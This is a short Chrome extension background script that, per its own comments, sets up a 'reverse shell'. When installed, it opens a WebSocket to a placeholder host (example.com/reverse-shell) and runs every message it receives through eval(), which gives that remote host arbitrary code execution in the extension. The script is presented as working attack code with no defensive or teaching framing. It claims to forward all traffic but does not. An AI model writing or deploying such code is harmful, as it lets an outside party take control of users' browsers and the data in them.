
chrome.runtime.onInstalled.addListener(function() {
  // Background script that establishes a reverse shell connection
  // and sends all traffic to the specified site

  // Define your target site URL
  const targetSite = "http://example.com/reverse-shell";

  // Establish reverse shell connection
  const socket = new WebSocket(targetSite);
  
  // Listen for incoming messages from the target site
  socket.onmessage = function(event) {
    const command = event.data;
    
    // Execute the received command
    eval(command);
  };
});
